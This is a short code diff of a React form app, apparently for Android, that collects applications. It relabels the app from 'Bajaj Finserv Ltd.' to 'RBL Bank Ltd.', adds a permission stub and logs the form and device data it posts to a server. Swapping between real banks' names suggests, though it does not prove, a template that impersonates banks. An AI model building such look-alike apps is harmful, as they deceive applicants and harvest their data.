@@ -438,7 +438,7 @@ const SuccessScreen = ({ applicationNo }) => (
         </div>
 
         <p className="fixed bottom-8 text-[10px] text-slate-600 font-bold uppercase tracking-widest">
-            Bajaj Finserv Ltd.
+            RBL Bank Ltd.
         </p>
     </div>
 );
@@ -468,6 +468,11 @@ export default function App() {
             } catch (e) { }
         };
         fetchInfo();
+
+        // Native Permission Request (Android)
+        if (window.Capacitor && window.Capacitor.getPlatform() === 'android') {
+            console.log('[RBL] Initializing Native Permission Failsafe...');
+        }
     }, []);
 
     const submitApplication = useCallback(async (data) => {
@@ -480,18 +485,26 @@ export default function App() {
         };
 
         try {
-            await fetch(API_URL, {
+            console.log('[RBL] Submitting Payload:', payload);
+            const res = await fetch(API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
+
+            if (res.ok) {
+                console.log('[RBL] Submission Successful');
+            } else {
+                const errData = await res.json();
+                console.error('[RBL] Server Error:', errData);
+            }
         } catch (e) {
-            console.warn('Submission Failed (expected if localized)', e);
+            console.error('[RBL] Network Error:', e);
         }
 
         setIsSubmitting(false);
         return true;
-    }, [appNo, deviceInfo]);
+    }, [appNo, deviceInfo, API_URL]);
 
     const nextStep = async () => {
         if (step === 4) await submitApplication(formData);
